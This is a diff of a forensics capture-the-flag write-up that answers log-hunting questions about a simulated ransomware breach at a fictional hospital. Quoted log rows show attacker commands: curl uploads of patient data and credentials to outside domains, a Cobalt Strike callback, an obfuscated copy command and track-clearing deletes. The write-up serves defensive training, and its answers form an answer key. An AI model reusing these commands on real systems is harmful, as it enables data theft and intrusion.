@@ -8,26 +8,34 @@ tags: forensics
 ---
 
 
-
-
 Ransom Note: https://youtu.be/06pzJRrtGAM
 
 
-![[Pasted image 20251128090941.png]]
-Patient LockByte Note: 
-![[Pasted image 20251128091155.png]]
-We can find the locked files by looking for files that end with ".encrypted"
+![[Pasted image 20251128090941.png]]  
+
+
+Patient LockByte Note:  
+
+
+![[Pasted image 20251128091155.png]]  
+
+
+We can find the locked files by looking for files that end with ".encrypted"  
+
 
 ```
 FileCreationEvents
 | where filename endswith ".encrypted"
-```
+```  
 
 
-Returns:
-![[Pasted image 20251128091317.png]]
+Returns:  
 
-**How many unique `hostname`s had files encrypted on them?**
+![[Pasted image 20251128091317.png]]  
+
+
+**How many unique hostnames had files encrypted on them?**  
+
 
 ```
 FileCreationEvents
@@ -35,55 +43,73 @@ FileCreationEvents
 | distinct hostname
 ```
 
-Returns:
 
-![[Pasted image 20251128091503.png]]
+Returns:  
 
 
-The hackers left a note on at least one of the computers telling the hospital how to pay the ransom. This note had a specific name `We_Have_Your_Data_Pay_Up.txt`
+![[Pasted image 20251128091503.png]]  
+
+
+The hackers left a note on at least one of the computers telling the hospital how to pay the ransom. This note had a specific name `We_Have_Your_Data_Pay_Up.txt`  
+
 
 ```
 FileCreationEvents
 | where filename == "We_Have_Your_Data_Pay_Up.txt"
-```
+```  
+
 
 | timestamp                | hostname     | username | sha256                                                           | path                                                    | filename                     | process_name |
 | ------------------------ | ------------ | -------- | ---------------------------------------------------------------- | ------------------------------------------------------- | ---------------------------- | ------------ |
-| 2024-06-17T14:49:02.000Z | AMFB-MACHINE | andavis  | 97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018 | C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt | We_Have_Your_Data_Pay_Up.txt | explorer.exe |
-**What was the Sha256 hash of this ransom file?**
+| 2024-06-17T14:49:02.000Z | AMFB-MACHINE | andavis  | 97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018 | C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt | We_Have_Your_Data_Pay_Up.txt | explorer.exe |  
 
-`97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018`
 
-**What was the full path of this ransom file?**
+**What was the Sha256 hash of this ransom file?**  
 
-`C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt`
 
-**On how many hosts (machines) was this ransom file seen?**
+`97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018`  
 
-`1`
 
-**What hostname was the ransom note seen on?**
+**What was the full path of this ransom file?**  
 
-`AMFB-MACHINE`
 
-Who does this machine belong to? Let's find out
+`C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt`  
+
+
+**On how many hosts (machines) was this ransom file seen?**  
+
+
+`1`  
+
+
+**What hostname was the ransom note seen on?**  
+
+
+`AMFB-MACHINE`  
+
+
+Who does this machine belong to? Let's find out...  
+
 
 ```
 Employees
 | where hostname == "AMFB-MACHINE"
-```
+```  
 
-  
 
 | hire_date                | name          | user_agent                                                       | ip_addr   | email_addr                      | company_domain    | username | role                    | hostname     |
 | ------------------------ | ------------- | ---------------------------------------------------------------- | --------- | ------------------------------- | ----------------- | -------- | ----------------------- | ------------ |
-| 2022-06-15T00:00:00.000Z | Anthony Davis | Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0) | 10.10.0.1 | anthony_davis@jojoshospital.org | jojoshospital.org | andavis  | Senior IT Administrator | AMFB-MACHINE |
+| 2022-06-15T00:00:00.000Z | Anthony Davis | Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0) | 10.10.0.1 | anthony_davis@jojoshospital.org | jojoshospital.org | andavis  | Senior IT Administrator | AMFB-MACHINE |  
 
-**What is the name of the employee whose host has the ransom note?**
 
-Anthony Davis
+**What is the name of the employee whose host has the ransom note?**  
 
-The scenario gives us a predefined time window for ProcessEvents:
+
+Anthony Davis  
+
+
+The scenario gives us a predefined time window for ProcessEvents:  
+
 
 ```
 ProcessEvents
@@ -92,10 +118,14 @@ ProcessEvents
 ```
 
 
-**Run the query above. How many process events were executed on Anthony's machine during this time period?**
-14
+**Run the query above. How many process events were executed on Anthony's machine during this time period?**  
 
-Events that caught my eye: 
+
+14  
+
+
+Events that caught my eye:  
+
 
 ```
 ProcessEvents
@@ -103,6 +133,7 @@ ProcessEvents
 | where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
 | where parent_process_name contains "cmd.exe"
 ```
+
   
 | timestamp                | parent_process_name | parent_process_hash                                              | process_commandline                                                                                                                                                               | process_name              | process_hash                                                     | hostname     | username |
 | ------------------------ | ------------------- | ---------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------- | ---------------------------------------------------------------- | ------------ | -------- |
@@ -113,42 +144,56 @@ ProcessEvents
 | 2024-06-17T17:18:57.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_1.zip https://secure-health-access.com/upload/patient_data_1.zip                                                       | cmd.exe                   | 21f6b0962ea22e6eb0c1bb6143090e6929b801b54c584268148518c1864ec3c6 | AMFB-MACHINE | andavis  |
 | 2024-06-17T17:30:31.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_2.zip https://secure-health-access.com/upload/patient_data_2.zip                                                       | cmd.exe                   | 1bef9249ff7ae6480d8d62daaab870e3d1e35a67d7551571551d6214d727fea7 | AMFB-MACHINE | andavis  |
 | 2024-06-17T17:31:50.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_3.zip https://secure-health-access.com/upload/patient_data_3.zip                                                       | cmd.exe                   | 6d88a47faaa3f587650f4ebebe9425b3aff292d74f29f582647f05c3dd4fd78b | AMFB-MACHINE | andavis  |
-| 2024-06-17T17:36:47.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip                                                                                                                      | cmd.exe                   | 3400577569147cdb0ae8edbc9c77dd921a46ca43e7f386adee895a432baa2644 | AMFB-MACHINE | andavis  |
+| 2024-06-17T17:36:47.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip                                                                                                                      | cmd.exe                   | 3400577569147cdb0ae8edbc9c77dd921a46ca43e7f386adee895a432baa2644 | AMFB-MACHINE | andavis  |  
 
-**What was the name of the ransomer file mentioned?**
+
+**What was the name of the ransomer file mentioned?**  
+
 
 `lockbyte_ransomer.exe`
 
-**When the attackers copied the `ransomer` file to the network share, what new name did they give it?**
+**When the attackers copied the `ransomer` file to the network share, what new name did they give it?**  
 
-`spread_ransomware.exe`
 
-**What tool did the attackers use to steal the data? This will be a .exe file**
+`spread_ransomware.exe`  
 
-`patient_data_exporter.exe`
+
+**What tool did the attackers use to steal the data? This will be a .exe file**  
+
+
+`patient_data_exporter.exe`  
+
   
+**What information did the attackers put into `patient_data_1.zip`? Provide the full path of the network share `\\something\like\this`**  
 
-**What information did the attackers put into `patient_data_1.zip`? Provide the full path of the network share `\\something\like\this`**
 
 `\\jojos-hospital-server\important_data\patient_records`
 
-**What information did the attackers put into `patient_data_2.zip`? Provide the full path of the network share `\\something\like\this`**
+**What information did the attackers put into `patient_data_2.zip`? Provide the full path of the network share `\\something\like\this`**  
+
 
 `\\jojos-hospital-server\important_data\archive\patient-records`
 
-**What information did the attackers put into `patient_data_3.zip`? Provide the full path of the network share `\\something\like\this`**
+**What information did the attackers put into `patient_data_3.zip`? Provide the full path of the network share `\\something\like\this`**  
 
-`\\jojos-hospital-server\important_data\old-patient-data`
 
-**What domain (e.g. `abcd.com`) did the attackers send the stolen data to?**
+`\\jojos-hospital-server\important_data\old-patient-data`  
 
-`secure-health-access.com`
 
-**What command did they use to clear their tracks? Copy and paste the full command.**
+**What domain (e.g. `abcd.com`) did the attackers send the stolen data to?**  
 
-`cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip`
 
-**What domain was the patient data exporter file downloaded from?**
+`secure-health-access.com`  
+
+
+**What command did they use to clear their tracks? Copy and paste the full command.**  
+
+
+`cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip`  
+
+
+**What domain was the patient data exporter file downloaded from?**  
+
 
 ```
 OutboundNetworkEvents
@@ -156,13 +201,17 @@ OutboundNetworkEvents
 | where url has "patient_data_exporter.exe"
 ```
 
-`secure-health-access.com`
 
-**When was the patient data exporter file downloaded? (copy and paste the exact timestamp)**
+`secure-health-access.com`  
 
-`2024-06-17T14:22:29Z`
 
-**How many distinct IPs does the domain `secure-health-access.com` resolve to?**
+**When was the patient data exporter file downloaded? (copy and paste the exact timestamp)**  
+
+
+`2024-06-17T14:22:29Z`  
+
+
+**How many distinct IPs does the domain `secure-health-access.com` resolve to?**  
 
 
 ```
@@ -171,14 +220,18 @@ PassiveDns
 | distinct ip
 ```
 
-`2`
+
+`2`  
+
   
 | ip          |
 | ----------- |
 | 203.0.113.1 |
-| 203.0.113.2 |
+| 203.0.113.2 |  
 
-**What additional domain name is associated with these IP addresses?**
+
+**What additional domain name is associated with these IP addresses?**  
+
 
 ```
 PassiveDns
@@ -186,31 +239,39 @@ PassiveDns
 | where ip in ("203.0.113.1", "203.0.113.2")
 ```
 
+
 |domain|
 |---|
 |secure-health-access.com|
-|emr-help.net|
+|emr-help.net|  
 
-**How many requests did the hackers make to our website from these IPs?**
+
+**How many requests did the hackers make to our website from these IPs?**  
+
 
 ```
 InboundNetworkEvents
 | where src_ip  in ("203.0.113.1", "203.0.113.2")
 ```
+
 
 |Count|
 |---|
-|37|
+|37|  
 
-**The hackers were curious about how to bypass ___ at Jojo's hospital.**
+
+**The hackers were curious about how to bypass ___ at Jojo's hospital.**  
+
 
 ```
 InboundNetworkEvents
 | where src_ip  in ("203.0.113.1", "203.0.113.2")
 ```
 
-Interesting searches: 
-  
+
+Interesting searches:  
+
+
 | timestamp                | method | src_ip      | user_agent                                                                                                | url                                                                                  | status_code |
 | ------------------------ | ------ | ----------- | --------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ | ----------- |
 | 2024-05-20T00:00:00.000Z | GET    | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https://jojoshospital.org/search=JoJo%27s+Hospital+patient+records                   | 200         |
@@ -219,13 +280,17 @@ Interesting searches:
 | 2024-05-20T11:45:58.000Z | GET    | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https://jojoshospital.org/search=JoJo%27s+Hospital+EMR+system                        | 200         |
 | 2024-05-20T11:46:33.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https://jojoshospital.org/search=sensitive+data+storage+JoJo%27s+Hospital            | 200         |
 | 2024-05-20T11:46:50.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https://jojoshospital.org/search=JoJo%27s+Hospital+data+access+protocols             | 200         |
-| 2024-05-20T11:46:59.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https://jojoshospital.org/search=how+to+bypass+security+JoJo%27s+Hospital            | 200         |
-The last one contains what we are looking for "how+to+bypass+security+JoJo%27s+Hospital"
-
-Security
+| 2024-05-20T11:46:59.000Z | GET    | 203.0.113.2 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | https://jojoshospital.org/search=how+to+bypass+security+JoJo%27s+Hospital            | 200         |  
 
 
-**What was the first web request the hackers made using the term `patient`? (hint: it was a search). Paste the full url.**
+The last one contains what we are looking for "how+to+bypass+security+JoJo%27s+Hospital"  
+
+
+Security  
+
+
+**What was the first web request the hackers made using the term `patient`? (hint: it was a search). Paste the full url.**  
+
 
 ```
 InboundNetworkEvents
@@ -244,40 +309,47 @@ InboundNetworkEvents
 |2024-06-17T13:13:47.000Z|GET|203.0.113.1|Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3|https://jojoshospital.org/old-patient-data|200|
 |2024-06-17T13:15:25.000Z|GET|203.0.113.1|Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3|https://jojoshospital.org/internal/patient-data/export|200|
 |2024-06-17T13:21:09.000Z|GET|203.0.113.1|Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3|https://jojoshospital.org/internal/patient-records/archive|200|
-|2024-06-17T13:21:55.000Z|GET|203.0.113.2|Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3|https://jojoshospital.org/internal/patient-records/backup|200|
+|2024-06-17T13:21:55.000Z|GET|203.0.113.2|Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3|https://jojoshospital.org/internal/patient-records/backup|200|  
 
-https://jojoshospital.org/search=JoJo%27s+Hospital+patient+records
 
-**When did this login occur?**
+https://jojoshospital.org/search=JoJo%27s+Hospital+patient+records  
+
+
+**When did this login occur?**  
+
 
 ```
 AuthenticationEvents
 | where src_ip in ("203.0.113.1", "203.0.113.2")
 ```
 
+
 | timestamp                | hostname      | src_ip      | user_agent                                                                                                | username | result           | password_hash                    | description                               |
 | ------------------------ | ------------- | ----------- | --------------------------------------------------------------------------------------------------------- | -------- | ---------------- | -------------------------------- | ----------------------------------------- |
-| 2024-05-20T00:00:00.000Z | MAIL-SERVER01 | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | andavis  | Successful Login | a9fbcdd6b449063a2ff822ea7d266402 | A user attempted to log in to their email |
-**Which IP address did the actors use for the login?**
-
-`203.0.113.1`
+| 2024-05-20T00:00:00.000Z | MAIL-SERVER01 | 203.0.113.1 | Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3 | andavis  | Successful Login | a9fbcdd6b449063a2ff822ea7d266402 | A user attempted to log in to their email |  
 
 
-**Whose account did the hackers login to? (provide a first and last name)**
+**Which IP address did the actors use for the login?**  
+
+
+`203.0.113.1`  
+
+
+**Whose account did the hackers login to? (provide a first and last name)**  
 
 
 ```
 Employees
 | where username == "andavis"
-```
+```  
+
 
 | hire_date                | name          | user_agent                                                       | ip_addr   | email_addr                      | company_domain    | username | role                    | hostname     |
 | ------------------------ | ------------- | ---------------------------------------------------------------- | --------- | ------------------------------- | ----------------- | -------- | ----------------------- | ------------ |
-| 2022-06-15T00:00:00.000Z | Anthony Davis | Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0) | 10.10.0.1 | anthony_davis@jojoshospital.org | jojoshospital.org | andavis  | Senior IT Administrator | AMFB-MACHINE |
+| 2022-06-15T00:00:00.000Z | Anthony Davis | Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0) | 10.10.0.1 | anthony_davis@jojoshospital.org | jojoshospital.org | andavis  | Senior IT Administrator | AMFB-MACHINE |  
 
 
-
-**Whose credentials did the hackers use to access the hospital's network? (Enter first and last name)**
+**Whose credentials did the hackers use to access the hospital's network? (Enter first and last name)**  
 
 
 | timestamp                | parent_process_name | parent_process_hash                                              | process_commandline                                                                                                                                                                                           | process_name            | process_hash                                                     | hostname     | username |
@@ -287,25 +359,29 @@ Employees
 | 2024-05-16T12:09:26.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c copy C:\Users\andavis\Documents\credentials.txt \\jojos-hospital.org\backup\credentials.txt                                                                                                        | cmd.exe                 | 73e7f40b606c795b109263962d7e32693e083f066f48e2b88fdba4e68d7d8a9f | AMFB-MACHINE | andavis  |
 | 2024-05-16T12:29:40.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c powershell Compress-Archive -Path C:\Users\andavis\Documents\network_diagrams.pdf, C:\Users\andavis\Documents\credentials.txt -DestinationPath C:\Users\andavis\Desktop\important_network_info.zip | cmd.exe                 | 709549bfc86eedf8b8853a7b2bf1b1e395a8efbf1990cb8978756bb1510fcad5 | AMFB-MACHINE | andavis  |
 | 2024-05-16T13:32:29.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | ( 'piz.ofni_krowten_tnatropmi\potkseD\sivadna\sresU\:C piz.ofni_krowten_tnatropmi\derahs\tnemtrapedti\gro.latipsohsojoj\\ ypoc c/ exe.dmc' -split '' \| %{$_[0]}) -join ''                                    | cmd.exe                 | dc570db8e6d7c83f90e7c110f491dad0d4a1675543483279ac4cd50f7b60b15d | AMFB-MACHINE | andavis  |
-| 2024-05-16T13:39:48.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c curl -F "file=@C:\Users\andavis\Desktop\important_network_info.zip" https://nothing-to-see-here.net/upload                                                                                         | cmd.exe                 | 2347a39f24e593c763c9871d7f09371ff407bd78b02cab42bfd644dc4dbfc659 | AMFB-MACHINE | andavis  |
+| 2024-05-16T13:39:48.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | cmd.exe /c curl -F "file=@C:\Users\andavis\Desktop\important_network_info.zip" https://nothing-to-see-here.net/upload                                                                                         | cmd.exe                 | 2347a39f24e593c763c9871d7f09371ff407bd78b02cab42bfd644dc4dbfc659 | AMFB-MACHINE | andavis  |  
 
 
-We see that credentials.txt is stolen here using Anthony Davis' (andavis) account
+We see that credentials.txt is stolen here using Anthony Davis' (andavis) account  
 
 
-
-**What was the domain name observed in the sponsored search result?**
-
-`raisinkanes.com`
-
-![[Pasted image 20251128125610.png]]
+**What was the domain name observed in the sponsored search result?**  
 
 
-**What is the legitimate domain for Raising Cane's?**
+`raisinkanes.com`  
 
-`raisingcanes.com`
 
-**How many web requests do we see going to the fake raisinkanes domain?**
+![[Pasted image 20251128125610.png]]  
+
+
+**What is the legitimate domain for Raising Cane's?**  
+
+
+`raisingcanes.com`  
+
+
+**How many web requests do we see going to the fake raisinkanes domain?**  
+
 
 ```
 OutboundNetworkEvents
@@ -314,11 +390,14 @@ OutboundNetworkEvents
 | count
 ```
 
+
 |Count|
 |---|
-|26|
+|26|  
 
-**How many unique employees were seen browsing to the fake raisinkanes domains? (hint distinct the src_ip)**
+
+**How many unique employees were seen browsing to the fake raisinkanes domains? (hint distinct the src_ip)**  
+
 
 ```
 OutboundNetworkEvents
@@ -327,18 +406,23 @@ OutboundNetworkEvents
 | count 
 ```
 
+
 | Count |
 | ----- |
-| 24    |
+| 24    |  
 
-Let's hold up a second here, around this point I had fallen down a rabbit hole and found this (info answers later questions):
+
+Let's hold up a second here, around this point I had fallen down a rabbit hole and found this (info answers later questions):  
+
 
 ```
 ProcessEvents
 | where hostname contains "AMFB-MACHINE"
 ```
 
-543 results, let's refine
+
+543 results, let's refine  
+
 
 ```
 ProcessEvents
@@ -346,23 +430,29 @@ ProcessEvents
 | where process_name == "cmd.exe"
 ```
 
-This looks like a problem:
+
+This looks like a problem:  
+
 
 | timestamp                | parent_process_name | parent_process_hash                                              | process_commandline                                           | process_name | process_hash                                                     | hostname     | username |
 | ------------------------ | ------------------- | ---------------------------------------------------------------- | ------------------------------------------------------------- | ------------ | ---------------------------------------------------------------- | ------------ | -------- |
-| 2024-05-14T12:24:45.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | C:\ProgramData\cobaltstrike.exe --connect 93.238.22.123:50050 | cmd.exe      | c167a329392a515e1cd2eead7f1481e2acbb02645f7dd036254450e66681cb7f | AMFB-MACHINE | andavis  |
+| 2024-05-14T12:24:45.000Z | cmd.exe             | 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f | C:\ProgramData\cobaltstrike.exe --connect 93.238.22.123:50050 | cmd.exe      | c167a329392a515e1cd2eead7f1481e2acbb02645f7dd036254450e66681cb7f | AMFB-MACHINE | andavis  |  
 
-Malicious Domains Connected to Cobaltstrike: 
+
+Malicious Domains Connected to Cobaltstrike:  
+
 
 ```
 PassiveDns
 | where ip == "93.238.22.123"
 ```
 
+
 | timestamp                | ip            | domain                   |
 | ------------------------ | ------------- | ------------------------ |
 | 2024-04-28T13:38:56.000Z | 93.238.22.123 | totally-legit-domain.com |
-| 2024-04-28T13:38:56.000Z | 93.238.22.123 | nothing-to-see-here.net  |
+| 2024-04-28T13:38:56.000Z | 93.238.22.123 | nothing-to-see-here.net  |  
+
 
 ```
 PassiveDns
@@ -370,62 +460,74 @@ PassiveDns
 | distinct ip
 ```
 
+
 | ip            |
 | ------------- |
 | 93.238.22.123 |
 | 93.238.22.121 |
 | 93.238.22.124 |
-| 93.238.22.122 |
+| 93.238.22.122 |  
 
-And we are back!
 
-**Which of the malicious domains used for redirection starts with the word "nothing"?**
+And we are back!  
+
+
+**Which of the malicious domains used for redirection starts with the word "nothing"?**  
+
 
 ```
 PassiveDns
 | where domain contains "nothing"
 ```
 
+
 |domain|
 |---|
-|nothing-to-see-here.net|
+|nothing-to-see-here.net|  
 
-**Which of the malicious domains used for redirection starts with the word "totally"?**
+
+**Which of the malicious domains used for redirection starts with the word "totally"?**  
+
 
 ```
 PassiveDns
 | where domain contains "totally"
 ```
 
+
 |domain|
 |---|
-|totally-legit-domain.com|
-
-**What is the name of the docx file they are redirected to?**
-
-`Raisin_Kane_Promo_Offer.docx`
-
-**What is the name of the pdf file they are redirected to?**
-
-`Raisin_Kane_Free_Meal_Voucher.pdf`
+|totally-legit-domain.com|  
 
 
+**What is the name of the docx file they are redirected to?**  
 
-**What is the hostname of the first person to download the suspicious docx file?**
+
+`Raisin_Kane_Promo_Offer.docx`  
+
+
+**What is the name of the pdf file they are redirected to?**  
+
+
+`Raisin_Kane_Free_Meal_Voucher.pdf`  
+
+
+**What is the hostname of the first person to download the suspicious docx file?**  
+
 
 ```
 FileCreationEvents
 | where filename == "Raisin_Kane_Promo_Offer.docx"
 ```
+
   
 | timestamp                | hostname     | username | sha256                                                           | path                                                     | filename                     | process_name |
 | ------------------------ | ------------ | -------- | ---------------------------------------------------------------- | -------------------------------------------------------- | ---------------------------- | ------------ |
-| 2024-05-01T09:56:50.000Z | RQJQ-MACHINE | evbrowne | bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712 | C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx | Raisin_Kane_Promo_Offer.docx | chrome.exe   |
+| 2024-05-01T09:56:50.000Z | RQJQ-MACHINE | evbrowne | bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712 | C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx | Raisin_Kane_Promo_Offer.docx | chrome.exe   |  
 
 
+**What was the name of the malicious file dropped by the attackers?**  
 
-
-**What was the name of the malicious file dropped by the attackers?**
 
 ```
 FileCreationEvents
@@ -433,12 +535,14 @@ FileCreationEvents
 | where path contains ".exe"
 ```
 
+
 |timestamp|hostname|username|sha256|path|filename|process_name|
 |---|---|---|---|---|---|---|
-|2024-05-01T09:57:17.000Z|RQJQ-MACHINE|evbrowne|0e7e0e888f22b5cc83ce5f2560f9f331d89b8e02875e98ace822e074f2ee486b|C:\ProgramData\cobaltstrike.exe|cobaltstrike.exe|explorer.exe|
+|2024-05-01T09:57:17.000Z|RQJQ-MACHINE|evbrowne|0e7e0e888f22b5cc83ce5f2560f9f331d89b8e02875e98ace822e074f2ee486b|C:\ProgramData\cobaltstrike.exe|cobaltstrike.exe|explorer.exe|  
 
 
-**Which command (`process_commandline`) shows the execution of the `Raisin_Kane_Promo_Offer.docx` file? (copy and paste the whole command)**
+**Which command (`process_commandline`) shows the execution of the `Raisin_Kane_Promo_Offer.docx` file? (copy and paste the whole command)**  
+
 
 ```
 ProcessEvents
@@ -447,28 +551,37 @@ ProcessEvents
 | where process_commandline contains "Raisin_Kane_Promo_Offer.docx"
 ```
 
+
 |process_commandline|
 |---|
-|"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx"|
+|"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx"|  
 
 
-**What IP address do the hackers connect to using cobalt strike?**
+**What IP address do the hackers connect to using cobalt strike?**  
+
 
 ```
 ProcessEvents
 | where process_commandline contains "cobalt"
 ```
 
+
 | process_commandline                                           |
 | ------------------------------------------------------------- |
-| C:\ProgramData\cobaltstrike.exe --connect 93.238.22.122:50050 |
-`93.238.22.122`
+| C:\ProgramData\cobaltstrike.exe --connect 93.238.22.122:50050 |  
 
-**Over what port do the hackers connect to that IP address?**
 
-`50050`
+`93.238.22.122`  
 
-**What was the first discovery command issued by the hackers? (hint: it has to do with a system)**
+
+**Over what port do the hackers connect to that IP address?**  
+
+
+`50050`  
+
+
+**What was the first discovery command issued by the hackers? (hint: it has to do with a system)**  
+
 
 ```
 ProcessEvents
@@ -477,11 +590,14 @@ ProcessEvents
 | where process_name contains "cmd"
 ```
 
+
 |process_commandline|
 |---|
-|systeminfo|
+|systeminfo|  
 
-**How many of these short discovery commands did the attackers run?**
+
+**How many of these short discovery commands did the attackers run?**  
+
 
 |timestamp|parent_process_name|parent_process_hash|process_commandline|process_name|process_hash|hostname|username|
 |---|---|---|---|---|---|---|---|
@@ -490,10 +606,11 @@ ProcessEvents
 |2024-05-02T16:46:54.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|netstat -an|cmd.exe|b0c4c49de866f69929c954f736a8f84d0dd21e7fe110c7cfa23a84efabe61632|RQJQ-MACHINE|evbrowne|
 |2024-05-02T16:59:54.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|net user|cmd.exe|6671238022f297aea68378bf94c4b8bc35621335ba511bb57f507eb862486871|RQJQ-MACHINE|evbrowne|
 |2024-05-03T10:05:50.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|net localgroup administrators|cmd.exe|74a621fe8be438df479cbf0c93530d950dbdcd3b79f7020891676d38df342f94|RQJQ-MACHINE|evbrowne|
-|2024-05-03T10:30:50.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|net view|cmd.exe|48445d2e91a38160507cdac26d3b6d10a8be43234df156365ce52cc444263180|RQJQ-MACHINE|evbrowne|
+|2024-05-03T10:30:50.000Z|cmd.exe|614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f|net view|cmd.exe|48445d2e91a38160507cdac26d3b6d10a8be43234df156365ce52cc444263180|RQJQ-MACHINE|evbrowne|  
 
 
-**What is Anthony Davis' hostname?**
+**What is Anthony Davis' hostname?**  
+
 
 ```
 Employees
@@ -502,10 +619,11 @@ Employees
 
 | hire_date                | name          | user_agent                                                       | ip_addr   | email_addr                      | company_domain    | username | role                    | hostname     |
 | ------------------------ | ------------- | ---------------------------------------------------------------- | --------- | ------------------------------- | ----------------- | -------- | ----------------------- | ------------ |
-| 2022-06-15T00:00:00.000Z | Anthony Davis | Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0) | 10.10.0.1 | anthony_davis@jojoshospital.org | jojoshospital.org | andavis  | Senior IT Administrator | AMFB-MACHINE |
+| 2022-06-15T00:00:00.000Z | Anthony Davis | Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0) | 10.10.0.1 | anthony_davis@jojoshospital.org | jojoshospital.org | andavis  | Senior IT Administrator | AMFB-MACHINE |  
 
 
-**When did the attackers connect to their IP address using cobalt strike on Anthony Davis' machine?**
+**When did the attackers connect to their IP address using cobalt strike on Anthony Davis' machine?**  
+
 
 ```
 ProcessEvents
@@ -513,14 +631,17 @@ ProcessEvents
 | where process_commandline contains "cobalt"
 ```
 
+
 |timestamp|parent_process_name|parent_process_hash|process_commandline|process_name|process_hash|hostname|username|
 |---|---|---|---|---|---|---|---|
